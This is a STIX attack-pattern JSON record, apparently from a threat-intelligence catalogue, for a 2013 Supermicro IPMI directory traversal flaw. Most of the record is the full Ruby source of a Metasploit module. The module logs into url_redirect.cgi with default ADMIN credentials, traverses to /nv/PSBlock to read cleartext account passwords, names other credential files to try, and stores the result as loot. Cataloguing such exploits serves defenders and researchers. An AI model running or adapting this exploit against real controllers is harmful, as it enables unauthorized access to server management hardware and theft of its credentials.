{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--01059559-b68f-452e-ab14-5de0cbf1d64a",
    "created": "2024-08-14T16:29:51.626592Z",
    "modified": "2024-08-14T16:29:51.626596Z",
    "name": "Supermicro Onboard IPMI url_redirect.cgi Authenticated Directory Traversal",
    "description": " This module abuses a directory traversal vulnerability in the url_redirect.cgi application accessible through the web interface of Supermicro Onboard IPMI controllers.  The vulnerability is present due to a lack of sanitization of the url_name parameter. This allows an attacker with a valid, but not necessarily administrator-level account, to access the contents of any file on the system. This includes the /nv/PSBlock file, which contains the cleartext credentials for all configured accounts. This module has been tested on a Supermicro Onboard IPMI (X9SCL/X9SCM) with firmware version SMT_X9_214. Other file names to try include /PSStore, /PMConfig.dat, and /wsman/simple_auth.passwd ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/http/smt_ipmi_url_redirect_traversal.rb",
            "external_id": "smt_ipmi_url_redirect_traversal.rb"
        },
        {
            "source_name": "reference",
            "url": "https://www.rapid7.com/blog/post/2013/11/06/supermicro-ipmi-firmware-vulnerabilities/"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/zenfish/ipmi/blob/master/dump_SM.py"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'uri'\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Scanner\n  include Msf::Auxiliary::Report\n\n\n  APP_NAME = \"Supermicro web interface\"\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'        => 'Supermicro Onboard IPMI url_redirect.cgi Authenticated Directory Traversal',\n      'Description' => %q{\n        This module abuses a directory traversal vulnerability in the url_redirect.cgi application\n        accessible through the web interface of Supermicro Onboard IPMI controllers.  The vulnerability\n        is present due to a lack of sanitization of the url_name parameter. This allows an attacker with\n        a valid, but not necessarily administrator-level account, to access the contents of any file\n        on the system. This includes the /nv/PSBlock file, which contains the cleartext credentials for\n        all configured accounts. This module has been tested on a Supermicro Onboard IPMI (X9SCL/X9SCM)\n        with firmware version SMT_X9_214. Other file names to try include /PSStore, /PMConfig.dat, and\n        /wsman/simple_auth.passwd\n      },\n      'Author'       =>\n        [\n          'hdm', # Discovery and analysis\n          'juan vazquez' # Metasploit module\n        ],\n      'License'     => MSF_LICENSE,\n      'References'  =>\n        [\n          [ 'URL', 'https://www.rapid7.com/blog/post/2013/11/06/supermicro-ipmi-firmware-vulnerabilities/' ],\n          [ 'URL', 'https://github.com/zenfish/ipmi/blob/master/dump_SM.py']\n        ],\n      'DisclosureDate' => '2013-11-06'))\n\n    register_options(\n      [\n        OptInt.new('DEPTH', [true, 'Traversal depth', 1]), # By default downloads from /tmp\n        OptString.new('FILEPATH', [true, 'The name of the file to download', '/nv/PSBlock']),\n        OptString.new('PASSWORD', [true, 'Password for Supermicro Web Interface', 'ADMIN']),\n        OptString.new('USERNAME', [true, 'Username for Supermicro Web Interface', 'ADMIN'])\n      ])\n  end\n\n  def my_basename(filename)\n    return ::File.basename(filename.gsub(/\\\\/, \"/\"))\n  end\n\n  def is_supermicro?\n    res = send_request_cgi(\n      {\n        \"uri\"       => \"/\",\n        \"method\"    => \"GET\"\n      })\n\n    if res and res.code == 200 and res.body.to_s =~ /ATEN International Co Ltd\\./\n      return true\n    else\n      return false\n    end\n  end\n\n  def login\n    res = send_request_cgi({\n      \"uri\"       => \"/cgi/login.cgi\",\n      \"method\"    => \"POST\",\n      \"vars_post\" => {\n        \"name\" => datastore[\"USERNAME\"],\n        \"pwd\"  => datastore[\"PASSWORD\"]\n      }\n    })\n\n    if res and res.code == 200 and res.body.to_s =~ /self.location=\"\\.\\.\\/cgi\\/url_redirect\\.cgi/ and res.get_cookies =~ /(SID=[a-z]+)/\n      return $1\n    else\n      return nil\n    end\n  end\n\n  def read_file(file, session)\n    travs = \"\"\n    travs << \"../\" * datastore['DEPTH']\n    travs << file\n\n    print_status(\"Retrieving file contents...\")\n\n    res = send_request_cgi({\n      \"uri\"           => \"/cgi/url_redirect.cgi\",\n      \"method\"        => \"GET\",\n      \"cookie\"        => session,\n      \"encode_params\" => false,\n      \"vars_get\"      => {\n        \"url_type\" => \"file\",\n        \"url_name\" => travs\n      }\n    })\n\n    if res and res.code == 200 and res.headers[\"Content-type\"].to_s =~ /text\\/html/ and res.headers[\"Pragma\"].nil?\n      return res.body.to_s\n    else\n      return nil\n    end\n  end\n\n  def run_host(ip)\n    print_status(\"Checking if it's a #{APP_NAME}....\")\n    if is_supermicro?\n      print_good(\"Check successful\")\n    else\n      print_error(\"#{APP_NAME} not found\")\n      return\n    end\n\n    print_status(\"Login into the #{APP_NAME}...\")\n    session = login\n    if session.nil?\n      print_error(\"Failed to login, check credentials.\")\n      return\n    else\n      print_good(\"Login Successful, session: #{session}\")\n    end\n\n    contents = read_file(datastore['FILEPATH'], session)\n    if contents.nil?\n      print_error(\"File not downloaded\")\n      return\n    end\n\n    file_name = my_basename(datastore['FILEPATH'])\n    path = store_loot(\n      'supermicro.ipmi.traversal.psblock',\n      'application/octet-stream',\n      rhost,\n      contents,\n      file_name\n    )\n    print_good(\"File saved in: #{path}\")\n  end\nend\n",
    "x_mitre_disclosure_date": "2013-11-06"
}